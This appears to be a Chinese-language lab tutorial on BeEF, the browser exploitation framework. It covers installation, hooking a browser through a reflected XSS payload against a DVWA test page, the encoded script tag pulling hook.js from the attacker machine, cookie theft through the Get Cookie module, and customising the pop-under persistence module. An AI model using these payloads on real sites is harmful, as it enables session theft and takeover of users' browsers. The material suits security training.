浏览器利用框架项目

![过程](./../../../images/BeEF/%E8%BF%87%E7%A8%8B.png)

## 1 安装

安装 Beef-XSS

```
┌──(root㉿Kali-24)-[~]
└─# apt update
┌──(root㉿Kali-24)-[~]
└─# apt install -y beef-xss
```

初始化 Beef-XSS

```
┌──(root㉿Kali-24)-[~]
└─# beef-xss
```

设置密码

```
[-] Please type a new password for the beef user: 
```

> 用户名    beef
> 
> 密码        beef-xss

在配置文件中查看密码

```
┌──(root㉿Kali-24)-[~]
└─# vim /etc/beef-xss/config.yaml
```

```
pass: beef
passwd: beef-xss
```

查看地址

```
[*]  Web UI: http://127.0.0.1:3000/ui/panel                                “控制台地址”
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>            “劫持地址”
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>        “模板地址"
```

查看主目录

```
┌──(root㉿Kali-24)-[~]
└─# ls /usr/share/beef-xss
```

浏览器访问

> http://192.168.1.24:3000/ui/panel
> 
> 查看控制台

浏览器访问

> http://192.168.1.24:3000/hook.js
> 
> 查看模板

## 2 劫持用户浏览器

利用提供的 hook.js 构造 payload 构造在目标 URL 中

当用户访问目标 URL ，即可劫持成功

实战

> [XSS 跨站脚本攻击.md](..\..\XSS 跨站脚本攻击\XSS 跨站脚本攻击.md)
> 
> 反射型 XSS 攻击劫持用户浏览器

浏览器访问

> http://192.168.1.76/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%32%34%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e
> 
> 劫持浏览器

## 3 beef 模块的使用

查看模块

![查看模块](./../../../images/BeEF/%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97.png)

颜色分类

![](./../../../images/BeEF/%E9%A2%9C%E8%89%B2%E5%88%86%E7%B1%BB.png)

| 操作   | 描述                        |
| ---- | ------------------------- |
| 绿色模块 | 表示模块适合目标浏览器，并且执行结果对客户端不可见 |
| 红色模块 | 表示模块不适用于当前用户，有些红色模块也可正常执行 |
| 橙色模块 | 模块可用，但结果对用户可见(CAM弹窗申请权限等) |
| 灰色模块 | 模块未在目标浏览器上测试过             |

### 3.1 获取 Cookie

执行 Get Cookie 模块

![执行 Get Cookie 模块](./../../../images/BeEF/%E6%89%A7%E8%A1%8C%20Get%20Cookie%20%E6%A8%A1%E5%9D%97.png)

查看获取到的 Cookie

![查看获取到的 Cookie](./../../../images/BeEF/%E6%9F%A5%E7%9C%8B%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%20Cookie.png)

### 3.2 弹窗

执行 Create Pop Under 模块

![执行 Create Pop Under 模块](./../../../images/BeEF/%E6%89%A7%E8%A1%8C%20Create%20Pop%20Under%20%E6%A8%A1%E5%9D%97.png)

弹出窗口

![弹出窗口](./../../../images/BeEF/%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3.png)

> 弹窗默认没有任何内容显示，可编辑弹窗文件，增加图片

切换到弹窗模块所在目录

```
┌──(root㉿Kali-24)-[~]
└─# cd /usr/share/beef-xss/modules/
```

```
┌──(root㉿Kali-24)-[/usr/share/beef-xss/modules]
└─# ls                    
browser  chrome_extensions  debug  exploits  host  ipec  metasploit  misc  network  persistence  phonegap  social_engineering
```

根据路径找到弹窗模块

```
┌──(root㉿Kali-24)-[/usr/share/beef-xss/modules]
└─# cd /usr/share/beef-xss/modules/persistence/popunder_window
```

```
┌──(root㉿Kali-24)-[/usr/…/beef-xss/modules/persistence/popunder_window]
└─# ls
command.js  config.yaml  module.rb
```

编辑配置文件

```
┌──(root㉿Kali-24)-[/usr/…/beef-xss/modules/persistence/popunder_window]
└─# vim command.js
```

修改

```
window.open(popunder_url,popunder_name,'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();
```

```
window.open(popunder_url,popunder_name,'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=550,height=320,left='+(screen.width/2-500)+',top='+(screen.height/2-200)+'').blur();
```

| 操作         | 描述                                                           |
| ---------- | ------------------------------------------------------------ |
| width=515  | 弹窗宽度 515 像素                                                  |
| height=320 | 弹窗高度 320 像素                                                  |
| left       | 弹窗距离浏览器左边的距离设置为 (screen.width/2-500)，其中 screen.width 为屏幕的宽度  |
| top        | 弹窗距离浏览器顶端的距离为 (screen.height/2-200) ，其中 screen.height 为屏幕的高度 |

> plain.html 是弹窗调用的 html 页面
> width=1 和 height=1 是控制弹窗的大小，left 和 top 是控制弹窗在屏幕上显示的位

切换到弹窗页面所在目录

```
┌──(root㉿Kali-24)-[/usr/…/beef-xss/modules/persistence/popunder_window]
└─# cd /usr/share/beef-xss/extensions/demos/html
```

```
┌──(root㉿Kali-24)-[/usr/…/beef-xss/extensions/demos/html]
└─# ls
adobe_flash_update.crx  ajax-loader.gif  beef.jpg  clickjacking  report.html       sound.wav
adobe_flash_update.png  basic.html       butcher   plain.html    secret_page.html
```

> plain.html 即是弹窗所调用的 html 文件

上传图片    `demo.jpg`    到以上目录

编辑 plain.html 文件

```
┌──(root㉿Kali-24)-[/usr/…/beef-xss/extensions/demos/html]
└─# vim plain.html
```

在 `<body> </body>` 中间插入如下代码

```
<a href="http://www.qq.com" target="_blank" ><img src="/demos/demo.jpg" width="500"></a>
```

| 操作              | 描述                |
| --------------- | ----------------- |
| a               | 链接标签              |
| href            | 指定点击后跳转到哪个链接地址    |
| target="_blank" | 指定点击广告图片后单独弹出一个页面 |

在浏览器上再次执行弹窗模块

![在浏览器上再次执行弹窗模块](./../../../images/BeEF/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E5%86%8D%E6%AC%A1%E6%89%A7%E8%A1%8C%E5%BC%B9%E7%AA%97%E6%A8%A1%E5%9D%97.png)

点击图片

![点击图片](./../../../images/BeEF/%E7%82%B9%E5%87%BB%E5%9B%BE%E7%89%87.png)

> 跳转到了 www.qq.com

---

References

- [BeEF](https://beefproject.com/)
